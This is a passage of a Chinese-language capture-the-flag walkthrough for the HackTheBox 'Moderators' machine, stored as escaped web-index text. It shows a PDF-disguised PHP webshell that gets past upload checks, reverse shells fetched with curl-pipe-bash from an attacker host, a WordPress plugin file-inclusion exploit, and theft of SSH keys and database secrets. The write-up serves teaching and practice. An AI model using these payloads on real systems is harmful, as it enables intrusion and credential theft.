IDOR \u7684\u653b\u51fb\uff0c\u56e0\u6b64\u65e5\u5fd7\u53ef\u80fd\u4e5f\u662f\u5982\u6b64\u3002 URL \u7684\u4e00\u90e8\u5206 (<code>e21cece511f43a5cb18d4932429915ed</code>) \u770b\u8d77\u6765\u50cf\u4e00\u4e2a MD5 \u54c8\u5e0c\u3002\u8fd9\u53ef\u80fd\u662f\u62a5\u544a\u7f16\u53f7\u7684\u54c8\u5e0c\u503c\u3002\u8ba9\u6211\u4eec\u786e\u8ba4\u4e00\u4e0b <code>e21cece511f43a5cb18d4932429915ed</code> \u662f\u5426\u786e\u5b9e\u662f 9798 \u7684\u54c8\u5e0c\u3002</p> <pre><code>$ echo -n 9798 | md5sum\n</code></pre> <p>![[Pasted image 20221112175410.png]]</p> <p><code>md5sum</code> \u7684\u8f93\u51fa\u8868\u660e\u54c8\u5e0c\u786e\u5b9e\u662f\u6839\u636e\u62a5\u544a ID \u751f\u6210\u7684\u3002\u8ba9\u6211\u4eec\u4e3a\u62a5\u544a ID \u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6240\u6709 MD5 \u54c8\u5e0c\u7684\u5217\u8868\u3002</p> <pre><code>$ for num in $(cat ffuf.report_ids.out | awk '{print $1}'); do echo -n $num |md5sum; done\n</code></pre> <p>![[Pasted image 20221112175715.png]]</p> <p>\u9996\u5148\u5bfc\u822a\u5230\u62a5\u544a <code>2589</code>\uff0c\u6211\u4eec\u770b\u5230\u63d0\u5230\u7684\u4e0a\u4f20\u9875\u9762\uff0c\u4f4d\u4e8e <code>/logs/report_log_upload.php</code></p> <p>![[Pasted image 20221112204018.png]]</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#foothold","title":"Foothold","text":"<p>\u8ba9\u6211\u4eec\u8bbf\u95ee <code>/logs/report_log_upload.php</code> \u5e76\u786e\u5b9a\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\u3002</p> <p>![[Pasted image 20221112204332.png]]</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2a PHP \u6587\u4ef6\u6765\u5c1d\u8bd5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u6267\u884c\u4ee3\u7801\u3002\u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a shell.php \u7684\u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u5982\u4e0b\u3002</p> <pre><code>&lt;?php echo system($_GET['cmd']); ?&gt;\n</code></pre> <p>\u5c1d\u8bd5\u4e0a\u4f20\u6587\u4ef6\u65f6\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u6307\u51fa\u53ea\u5141\u8bb8 PDF \u6587\u4ef6\uff01 .\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e9b\u7ed5\u8fc7\u6587\u4ef6\u7c7b\u578b\u68c0\u67e5\u7684\u5e38\u7528\u65b9\u6cd5\u3002\u7528\u4e8e\u9a8c\u8bc1\u6587\u4ef6\u4e0a\u4f20\u7684\u4e09\u79cd\u6700\u5e38\u7528\u65b9\u6cd5\u662f\uff1a</p> <p>\u68c0\u67e5\u6587\u4ef6\u6269\u5c55\u540d\uff08\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f <code>.pdf</code> \uff09 \u68c0\u67e5\u4e0a\u4f20\u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684 MIME \u7c7b\u578b\uff08\u8fd9\u9700\u8981\u662f <code>application/pdf</code> \uff09 \u68c0\u67e5\u9b54\u672f\u5b57\u8282(magic bytes)\uff08 <code>%PDF-</code> \uff09\u3002\u8fd9\u4e9b\u4f4d\u4e8e\u6bcf\u4e2a\u6587\u4ef6\u7684\u5f00\u5934\uff0c\u6307\u793a\u6587\u4ef6\u7c7b\u578b\u3002</p> <p>\u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a shell.pdf.php \u7684\u65b0\u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u5982\u4e0b\u3002</p> <pre><code>%PDF-&lt;?php echo system($_GET['cmd']); ?&gt;\n</code></pre> <p>\u6211\u4eec\u4f7f\u7528 Burpsuite \u62e6\u622a\u4e0a\u4f20\u8bf7\u6c42\u5e76\u5c06 MIME \u7c7b\u578b\u66f4\u6539\u4e3a <code>application/pdf</code> \u3002\u6574\u4e2a\u8bf7\u6c42\u5982\u4e0b\u6240\u793a\u3002 ![[Pasted image 20221112204955.png]]</p> <p>\u8f6c\u53d1\u8bf7\u6c42\u540e\uff0c\u6211\u4eec\u6536\u5230\u901a\u77e5\u8bf4\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\uff1b\u4f46\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u627e\u5230\u53ef\u4ee5\u627e\u5230\u4e0a\u4f20\u62a5\u544a\u7684\u4f4d\u7f6e\u3002\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 <code>Ffuf</code> \u66b4\u529b\u7834\u89e3\u4e0a\u4f20\u6587\u4ef6\u5939\u7684\u540d\u79f0\u3002</p> <pre><code>$ ffuf -u 'http://10.10.11.173/logs/FUZZ' -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>![[Pasted image 20221112205108.png]]</p> <p><code>Ffuf</code> \u547d\u4ee4\u7684\u8f93\u51fa\u663e\u793a\u540d\u79f0\u4e3a <code>uploads</code> \u7684\u6761\u76ee\u3002\u8ba9\u6211\u4eec\u5bfc\u822a\u5230 <code>/logs/uploads/shell.pdf.php?cmd=id</code> \u5e76\u68c0\u67e5\u6211\u4eec\u7684\u547d\u4ee4\u662f\u5426\u6267\u884c\u3002</p> <p>\u8bbf\u95ee\u6b64\u94fe\u63a5\u540e\uff0c\u6211\u4eec\u6ca1\u6709\u5f97\u5230\u4efb\u4f55\u8f93\u51fa\uff0c\u8fd9\u610f\u5473\u7740\u670d\u52a1\u5668\u53ef\u80fd\u963b\u585e\u4e86\u4e00\u4e9b\u51fd\u6570\uff0c\u4f8b\u5982 system() \u3002 Hacktricks \u6709\u4e00\u4e9b\u7cfb\u7edf\u66ff\u4ee3\u65b9\u6848\uff0c\u5728\u67e5\u770b\u5217\u8868\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u4ee5\u4e0b\u6709\u6548\u8d1f\u8f7d\u6709\u6548\u3002</p> <pre><code>%PDF-&lt;?php echo fread(popen($_GET['cmd'], \"r\"), 4096); ?&gt;\n</code></pre> <p>\u6211\u4eec\u5c06\u6709\u6548\u8d1f\u8f7d\u4e0a\u4f20\u4e3a <code>rp.pdf.php</code> \uff0c\u8bb0\u4f4f\u518d\u6b21\u66f4\u6539\u8bf7\u6c42\u4e2d\u7684 MIME \u7c7b\u578b\uff0c\u5e76\u83b7\u53d6\u547d\u4ee4\u7684\u8f93\u51fa\u3002</p> <p>![[Pasted image 20221112205650.png]]</p> <p>\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u540e\uff0c\u6211\u4eec\u73b0\u5728\u5c1d\u8bd5\u901a\u8fc7\u521b\u5efa\u4ee5\u4e0b\u540d\u4e3a <code>shell.sh</code> \u7684\u6587\u4ef6\u6765\u83b7\u53d6\u53cd\u5411 shell\uff0c\u5176\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>#!/bin/bash \nbash -i &gt;&amp; /dev/tcp/10.10.14.29/1337 0&gt;&amp;1\n</code></pre> <p>\u6211\u4eec\u5c06\u6587\u4ef6\u6258\u7ba1\u5728 Web \u670d\u52a1\u5668\u4e0a\u3002</p> <pre><code>$ python3 -m http.server 8080\n</code></pre> <p>\u4e0b\u4e00\u6b65\uff0c\u6211\u4eec\u542f\u52a8 <code>netcat</code> \u76d1\u542c <code>1337</code> \u7aef\u53e3</p> <pre><code>$ nc -lvnp 1337\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u4eec\u5728\u76ee\u6807\u673a\u5668\u4e0a\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u89e6\u53d1\u6211\u4eec\u7684 payload</p> <pre><code>$ curl 10.10.14.29:8080/shell.sh|bash\n</code></pre> <p>\u901a\u8fc7\u5bfc\u822a\u5230 <code>/logs/uploads/rp.pdf.php?</code> \u53d1\u9001\u547d\u4ee4\u540e <code>cmd=curl+10.10.14.29:8080%2Fshell.sh|bash</code> \uff0c\u6211\u4eec\u5728 netcat \u76d1\u542c\u5668\u4e0a\u6536\u5230\u4e00\u4e2a\u53cd\u5411 shell</p> <p>![[Pasted image 20221112210122.png]]</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#lateral-movement","title":"Lateral Movement","text":"<p>\u6211\u4eec\u9996\u5148\u5bfb\u627e\u53ef\u80fd\u5728\u4ec5\u4fa6\u542c localhost \u7684\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684\u4efb\u4f55\u670d\u52a1\u3002</p> <pre><code>ss -tlpn\n</code></pre> <p>![[Pasted image 20221112210201.png]]</p> <p><code>ss</code> \u7684\u8f93\u51fa\u663e\u793a\u6b63\u5728\u76d1\u542c\u7684\u672c\u5730\u7aef\u53e3\uff1b\u5176\u4e2d\uff0c\u7aef\u53e3 <code>8080</code> \u3002\u8ba9\u6211\u4eec\u5c1d\u8bd5\u67e5\u627e\u6b63\u5728\u4f7f\u7528\u6b64\u7aef\u53e3\u7684\u8fdb\u7a0b\u3002</p> <pre><code>ps aux | grep 8080\n</code></pre> <p>![[Pasted image 20221112210248.png]]</p> <p>\u8f93\u51fa\u663e\u793a <code>/opt/site.new/</code> \u5904\u7684\u76ee\u5f55\uff0c\u5e76\u663e\u793a\u8be5\u8fdb\u7a0b\u6b63\u5728\u4ee5\u7528\u6237 lexi \u8eab\u4efd\u8fd0\u884c\u3002\u68c0\u67e5\u76ee\u5f55\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u6258\u7ba1\u4e86\u4e00\u4e2a <code>WordPress</code> \u7ad9\u70b9\u3002\u6211\u4eec\u53ef\u4ee5\u67e5\u770b plugins \u6587\u4ef6\u5939\u4ee5\u627e\u5230\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u7684\u63d2\u4ef6\u3002</p> <pre><code>$ ls -l /opt/site.new/wp-content/plugins/\n</code></pre> <p>![[Pasted image 20221112210333.png]]</p> <p>\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u8f93\u51fa\u663e\u793a\u6709\u4e24\u4e2a\u63d2\u4ef6\uff0c<code>brandfolder</code> \u548c <code>passwordmanager</code>\u3002\u5728\u641c\u7d22 <code>brandfolder</code> \u6f0f\u6d1e\u5229\u7528\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u5bb9\u6613\u53d7\u5230\u672c\u5730\u6587\u4ef6\u5305\u542b\u7684\u5f71\u54cd\u3002\u94fe\u63a5\u663e\u793a\u6f0f\u6d1e\u5b58\u5728\u4e8e\u4ee5\u4e0b\u4ee3\u7801\u4e2d\u3002</p> <pre><code>&lt;?php\nini_set('display_errors',1);\nini_set('display_startup_errors',1);\nerror_reporting(-1);\nrequire_once($_REQUEST['wp_abspath'] . 'wp-load.php');\nrequire_once($_REQUEST['wp_abspath'] . 'wp-admin/includes/media.php');\nrequire_once($_REQUEST['wp_abspath'] . 'wp-admin/includes/file.php');\nrequire_once($_REQUEST['wp_abspath'] . 'wp-admin/includes/image.php');\nrequire_once($_REQUEST['wp_abspath'] . 'wp-admin/includes/post.php');\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u6709\u4e00\u4e2a\u52a0\u8f7d PHP \u6587\u4ef6\u7684\u51fd\u6570\u3002\u52a0\u8f7d\u9759\u6001 PHP \u6587\u4ef6\u5f88\u53ef\u80fd\u4e0d\u662f\u6f0f\u6d1e\u98ce\u9669\uff0c\u4f46\u662f\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4f1a\u5904\u7406\u7528\u6237\u8f93\u5165\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u52a0\u8f7d\u4efb\u610f\u6587\u4ef6\u3002\u5728\u4ee3\u7801\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230 <code>$_REQUEST['wp_abspath']</code> \u88ab\u4f7f\u7528\uff0c\u5b83\u5728\u6211\u4eec\u7684\u63a7\u5236\u4e4b\u4e2d\uff0c\u56e0\u4e3a\u5b83\u662f\u4e00\u4e2a\u8bf7\u6c42\u53c2\u6570\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u5c06 /dev/shm/ \u4f5c\u4e3a\u8f93\u5165\uff0c\u5b83\u5c06\u52a0\u8f7d <code>/dev/shm/wp-load.php</code> \uff0c\u9644\u52a0\u5230\u6211\u4eec\u8f93\u5165\u7684\u5176\u4ed6\u8def\u5f84\u4e5f\u662f\u5982\u6b64\u3002\u4e3a\u4e86\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u9996\u5148\u5728 <code>/dev/shm/wp-load.php</code> \u4e2d\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\u7684\u6587\u4ef6\u3002</p> <pre><code>&lt;?php echo fread(popen(\"curl 10.10.14.42:8989/s2.sh|bash\", \"r\"), 4096); ?&gt;\n</code></pre> <p>\u6211\u4eec\u4fee\u6539\u73b0\u6709\u7684 <code>shell.sh</code> \u5e76\u5c06\u7aef\u53e3 <code>1337</code> \u66f4\u6539\u4e3a <code>4444</code> \u5e76\u5728\u7aef\u53e3 <code>4444</code> \u4e0a\u542f\u52a8 <code>netcat</code> \u4fa6\u542c\u5668\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4f7f\u7528 <code>cURL</code> \u6765\u5c1d\u8bd5\u6267\u884c\u6211\u4eec\u7684\u53cd\u5411 shell\u3002</p> <pre><code>$ curl -s 'http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/'\n</code></pre> <p>\u53d1\u51fa\u8bf7\u6c42\u540e\uff0c\u6211\u4eec\u5728\u7aef\u53e3 4444 \u4e0a\u6536\u5230\u4e00\u4e2a shell\u3002 ![[Pasted image 20221112210708.png]]</p> <p>\u5728\u4ee5\u7528\u6237 <code>lexi</code> \u83b7\u5f97 shell \u540e\uff0c\u6211\u4eec\u5f88\u5feb\u6ce8\u610f\u5230\u8be5\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e2d\u6709 SSH \u5bc6\u94a5\u3002\u8ba9\u6211\u4eec\u5728\u672c\u5730\u590d\u5236\u5b83\u4eec\u5e76\u901a\u8fc7 SSH \u8fde\u63a5\u3002</p> <pre><code>$ cat /home/lexi/.ssh/id_rsa\n</code></pre> <p>![[Pasted image 20221112210906.png]]</p> <p>\u6211\u4eec\u5c06\u5bc6\u94a5\u590d\u5236\u5230\u6211\u4eec\u7684\u673a\u5668\u4e0a\uff0c\u5c06\u5176\u6743\u9650\u8bbe\u7f6e\u4e3a 600 \uff0c\u7136\u540e\u4ee5 <code>lexi</code> \u8eab\u4efd\u901a\u8fc7 SSH \u8fdb\u5165\u7cfb\u7edf\u3002</p> <pre><code>$ chmod 600 lexi.ssh \n$ ssh -i lexi.ssh lexi@10.10.11.173\n</code></pre> <p>![[Pasted image 20221112210956.png]]</p> <p>\u4f5c\u4e3a <code>lexi</code> \uff0c\u6211\u4eec\u73b0\u5728\u6709\u6743\u8bfb\u53d6 <code>/opt/site.new/wp-config.php</code> \uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u3002\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u4ee5\u4e0b\u51ed\u636e\u3002</p> <pre><code>define( 'DB_NAME', 'wordpress' ); \n\n/** MySQL database username */ \ndefine( 'DB_USER', 'wordpressuser' ); \n\n/** MySQL database password */ \ndefine( 'DB_PASSWORD', 'p' );\n</code></pre> <p>\u4f7f\u7528\u8fd9\u4e9b\u51ed\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u767b\u5f55 mysql \u3002</p> <pre><code>mysql -u wordpressuser -p\n</code></pre> <p>![[Pasted image 20221112211134.png]]</p> <p>\u8981\u68c0\u67e5 WordPress \u4f7f\u7528\u7684\u8868\uff0c\u6211\u4eec\u5fc5\u987b\u9996\u5148\u66f4\u6539\u4e3a\u6570\u636e\u5e93</p> <pre><code>USE wordpress; \nSHOW TABLES;\n</code></pre> <p>![[Pasted image 20221112211225.png]]</p> <p>\u4ece\u524d\u9762\u547d\u4ee4\u7684\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6570\u636e\u5e93\u4e2d\u5b58\u5728\u4e0d\u7b26\u5408 <code>WordPress</code> \u6807\u51c6\u7684\u8868\uff0c\u7279\u522b\u662f <code>wp_pms_passwords</code> \u3002\u8be5\u8868\u53ef\u4ee5\u7531\u63d2\u4ef6\u4f7f\u7528\u3002\u9274\u4e8e\u5f53\u524d\u5b89\u88c5\u4e86\u4e24\u4e2a\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe\u5b83\u662f <code>passwords-manager</code> \u3002\u5728\u641c\u7d22\u5f15\u64ce\u4e0a\u641c\u7d22\u63d2\u4ef6\uff0c\u6211\u4eec\u627e\u5230\u4ee5\u4e0b\u94fe\u63a5\uff0c\u8bf4\u660e\u8be5\u63d2\u4ef6\u5c06 AES 128 \u52a0\u5bc6\u5bc6\u7801\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u8868\u5305\u542b\u7684\u5185\u5bb9</p> <pre><code>DESCRIBE wp_pms_passwords; \nSELECT user_name, user_email FROM wp_pms_passwords;\n</code></pre> <p>![[Pasted image 20221112211400.png]]</p> <p>\u4e0a\u9762\u7684\u8f93\u51fa\u663e\u793a\u6709\u4e00\u4e2a\u7528\u6237\u540d\u8bbe\u7f6e\u4e3a <code>SSH key</code> \u548c\u7535\u5b50\u90ae\u4ef6\u8bbe\u7f6e\u4e3a <code>john@moderators.htb</code> \u7684\u6761\u76ee\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8bfb\u53d6\u5bc6\u94a5\u3002</p> <pre><code>SELECT user_password FROM wp_pms_passwords WHERE user_email='john@moderators.htb';\n</code></pre> <p>![[Pasted image 20221112211513.png]]</p> <p>\u6211\u4eec\u5c06\u5bc6\u94a5\u590d\u5236\u5230\u672c\u5730\u6587\u4ef6\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u52a0\u5bc6\u7684\u5bc6\u7801\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5bc6\u94a5\u6765\u89e3\u5bc6\u5b83\u3002\u67e5\u770b <code>/opt/site.new/wpcontent/plugins/passwords-manager</code> \u4e2d\u7684 <code>passwords-manager</code> \u63d2\u4ef6\u7684\u6e90\u4ee3\u7801\uff0c\u6211\u4eec\u627e\u5230\u4e86\u611f\u5174\u8da3\u7684\u7279\u5b9a\u884c\u3002</p> <pre><code>$ $key_qry = \"SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'\";\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u884c\u663e\u793a\u6709\u4e00\u4e2a\u540d\u4e3a <code>pms_encrypt_key</code> \u7684 WordPress \u914d\u7f6e\u9009\u9879\uff0c\u5176\u4e2d\u5b58\u50a8\u4e86\u5bc6\u94a5\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u67e5\u8be2\u67e5\u770b\u503c</p> <pre><code>SELECT option_value FROM wp_options WHERE option_name='pms_encrypt_key';\n\n(@McEXk%HU#{/R3s\n</code></pre> <p>![[Pasted image 20221112211641.png]]</p> <p>\u987e\u540d\u601d\u4e49\uff0cMySQL\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u6211\u4eec\u6570\u636e\u7684\u52a0\u89e3\u5bc6\u5bc6\u94a5\u3002\u6211\u4eec\u73b0\u5728\u62e5\u6709\u52a0\u5bc6\u6570\u636e\u548c\u89e3\u5bc6\u5bc6\u94a5\u3002\u6211\u4eec\u73b0\u5728\u9700\u8981\u7684\u53ea\u662f\u89e3\u5bc6\u7b97\u6cd5\u3002\u67e5\u770b\u66f4\u591a\u6e90\u4ee3\u7801\u65f6\uff0c\u6211\u4eec\u4f1a\u5728 <code>/opt/site.new/wp-content/plugins/passwords-manager/inc/encryption.php</code> \u627e\u5230\u5904\u7406\u52a0\u5bc6\u7684\u6587\u4ef6\u3002\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\u3002</p> <pre><code>&lt;?php\n\nclass Encryption\n{\n    protected $encryptMethod = 'AES-256-CBC';\n    /**\n    * Decrypt string.\n    */\n    public function decrypt($encryptedString, $key)\n    {\n    $json = json_decode(base64_decode($encryptedString), true); \n    &lt;SNIP&gt;\n    $hashKey = hash_pbkdf2('sha512', $key, $salt, $iterations, ($this- &gt;encryptMethodLength() / 4)); \n    unset($iterations, $json, $salt); \n\n    $decrypted= openssl_decrypt($cipherText , $this-&gt;encryptMethod, hex2bin($hashKey), OPENSSL_RAW_DATA, $iv); \n\n    unset($cipherText, $hashKey, $iv); \n\n    return $decrypted;\n    }// decrypt\n    protected function encryptMethodLength() \n    { \n        $number = filter_var($this-&gt;encryptMethod, FILTER_SANITIZE_NUMBER_INT);\n        return intval(abs($number));\n    }// encryptMethodLength\n\n    /**\n    * Set encryption method\n    */\n    public function setCipherMethod($cipherMethod) \n    {\n        $this-&gt;encryptMethod = $cipherMethod;\n    }// setCipherMethod\n}\n</code></pre> <p>\u6211\u4eec\u4fee\u6539\u6b64\u6587\u4ef6\uff0c\u4ee5\u4fbf\u6211\u4eec\u80fd\u591f\u89e3\u5bc6 John \u5e10\u6237\u7684 SSH \u5bc6\u94a5\u3002\u6700\u7ec8\u6587\u4ef6\u7684\u5185\u5bb9\u5982\u4e0b\u3002</p> <pre><code>&lt;?php\nclass Encryption {\n    protected $encryptMethod = 'AES-256-CBC';\n    public function decrypt($encryptedString, $key) {\n        $json = json_decode(base64_decode($encryptedString), true);\n        try {\n            $salt = hex2bin($json[\"salt\"]);\n            $iv = hex2bin($json[\"iv\"]);\n        }\n        catch(Exception $e) {\n            return null;\n        }\n        $cipherText = base64_decode($json['ciphertext']);\n        $iterations = intval(abs($json['iterations']));\n        if ($iterations &lt;= 0) {\n            $iterations = 999;\n        }\n        $hashKey = hash_pbkdf2('sha512', $key, $salt, $iterations);\n        unset($iterations, $json, $salt);\n        $decrypted = openssl_decrypt($cipherText, $this-&gt;encryptMethod, hex2bin($hashKey), OPENSSL_RAW_DATA, $iv);\n        unset($cipherText, $hashKey, $iv);\n        return $decrypted;\n    }\n}\n$e = new Encryption();\n$c = 'eyJjaXBoZXJ0ZXh0&lt;--SNIP--&gt;';\n$d = $e-&gt;decrypt($c, '(@McEXk%HU#{/R3s');\necho $d; ?&gt;\n</code></pre> <p>\u6211\u4eec\u5220\u9664\u4e86\u51e0\u4e2a\u4e0d\u5fc5\u8981\u7684\u51fd\u6570\uff1a setCipherMethod()\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u4f7f\u7528\u4e00\u4e2a\u5bc6\u7801\u3002  encryptionMethodLength()\uff0c\u89e3\u5bc6\u4e0d\u9700\u8981\u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>\u968f\u7740\u51fd\u6570\u7684\u5220\u9664\uff0c\u6211\u4eec\u5c06\u52a0\u5bc6\u6570\u636e\u6dfb\u52a0\u5230\u540d\u4e3a <code>$c</code> \u7684\u53d8\u91cf\u4e2d\uff0c\u5e76\u4f7f\u7528\u6211\u4eec\u4ece MySQL \u6536\u96c6\u7684\u89e3\u5bc6\u5bc6\u94a5\u5c06\u5176\u89e3\u5bc6\u4e3a\u540d\u4e3a <code>$d</code> \u7684\u53d8\u91cf\u3002</p> <p>\u8fd0\u884c\u4e0a\u9762\u63d0\u5230\u7684 PHP \u6587\u4ef6\uff0c\u6211\u4eec\u5f97\u5230\u4ee5\u4e0b\u8f93\u51fa\u3002</p> <pre><code>$ php decrypt.php\n</code></pre> <p>![[Pasted image 20221112212523.png]]</p> <p>\u5728\u4e0a\u9762\u7684\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684\u952e\u6709\u7a7a\u683c\u800c\u4e0d\u662f\u6362\u884c\u7b26\u3002</p> <p>\u4f7f\u7528\u4e00\u4e9b\u547d\u4ee4\u884c\u9b54\u6cd5\uff0c\u6211\u4eec\u7528\u6362\u884c\u7b26\u66ff\u6362\u6240\u6709\u7a7a\u683c\u5e76\u5c06\u7ed3\u679c\u8f6c\u50a8\u5230\u4e00\u4e2a\u540d\u4e3a <code>john.ssh</code> \u7684\u6587\u4ef6\u4e2d\u3002</p> <pre><code>(echo '-----BEGIN OPENSSH PRIVATE KEY-----'; php decrypt.php | sed 's/ /\\n/g' | grep -v OPEN | tail -n+4 | head -n-3; echo '-----END OPENSSH PRIVATE KEY-----') &gt; john.ssh\n</code></pre> <p>\u6700\u540e\u6211\u4eec\u5c06 SSH \u5bc6\u94a5\u7684\u6743\u9650\u8bbe\u7f6e\u4e3a 600 \u5e76\u767b\u5f55\u3002</p> <pre><code>$ chmod 600 john.ssh \n$ ssh -i john.ssh john@10.10.11.173\n</code></pre> <p>![[Pasted image 20221112212643.png]]</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u5728 john \u7684\u4e3b\u76ee\u5f55\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u4e24\u4e2a\u76ee\u5f55\uff0c scripts \u548c stuff \u3002\u4e4d\u4e00\u770b\uff0cscripts \u6587\u4ef6\u5939\u4f3c\u4e4e\u5305\u542b\u968f\u673a\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u6765\u770b\u770b stuff \u3002\u5728 stuff \u76ee\u5f55\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u53e6\u5916\u4e24\u4e2a\u540d\u4e3a VBOX \u548c exp \u7684\u76ee\u5f55\u3002 exp \u6587\u4ef6\u5939\u4f3c\u4e4e\u5305\u542b\u5bfc\u51fa\u7684\u804a\u5929\u6d88\u606f\u3002\u8ba9\u6211\u4eec\u4f7f\u7528\u5e26\u6709 -r \u6807\u5fd7\u7684 grep \u9012\u5f52\u641c\u7d22\u804a\u5929\u65e5\u5fd7\u4e2d\u63d0\u53ca\u7684\u4efb\u4f55\u5bc6\u7801\u3002</p> <pre><code>$ grep password -r\n</code></pre> <p>![[Pasted image 20221113074817.png]]</p> <p>\u9605\u8bfb\u66f4\u591a\u6587\u4ef6 2021-09-19.exp \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u66f4\u591a\u80cc\u666f\u4fe1\u606f\u3002</p> <pre><code>9/19/21, 00:44 - CARTOR BAIL: U know, I miss the old Sysadmin john. He was funny and stupid at the same time. ;) \n9/19/21, 00:44 - JOHN MILLER: Hahaha real funny. But it's kinda true though. \n9/19/21, 00:44 - CARTOR BAIL: Doing reboots at the deployement, Calling our clinet bro, using the same dubmb password... God I miss those days.\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u804a\u5929\u8bb0\u5f55\u4e2d\uff0c\u63d0\u5230\u4e86 john \u91cd\u590d\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u5bc6\u7801\u3002\u8ba9\u6211\u4eec\u6682\u65f6\u8bb0\u4e0b\u8fd9\u4e00\u70b9\uff0c\u7136\u540e\u770b\u4e00\u4e0b VBOX \u6587\u4ef6\u5939\u3002\u5728 VBOX \u6587\u4ef6\u5939\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u6709\u4e24\u4e2a\u540d\u4e3a <code>2019.vdi</code> \u548c <code>2019-08-01.vbox</code> \u7684\u6587\u4ef6\u3002\u5177\u6709 <code>.vdi</code> \u6269\u5c55\u540d\u7684\u6587\u4ef6\u662f Virtual Disk Image\uff0c\u7531 VirtualBox \u4f7f\u7528\u3002\u8ba9\u6211\u4eec\u4f7f\u7528 <code>scp</code> \u5b9e\u7528\u7a0b\u5e8f\u4e0b\u8f7d\u8fd9\u4e24\u4e2a\u6587\u4ef6\u3002</p> <pre><code>$ scp -i john.ssh -r john@$t:~/stuff/VBOX .\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u5c06 <code>2019.vdi</code> \u78c1\u76d8\u9644\u52a0\u5230\u865a\u62df\u673a\u3002\u5728\u6211\u4eec\u7684\u865a\u62df\u673a\u8bbe\u7f6e\u4e2d\uff0c\u6211\u4eec\u8f6c\u5230 <code>storage</code>\uff0c\u5355\u51fb <code>Add new storage</code> &gt; <code>Hard Disk</code>\uff0c\u7136\u540e\u5355\u51fb 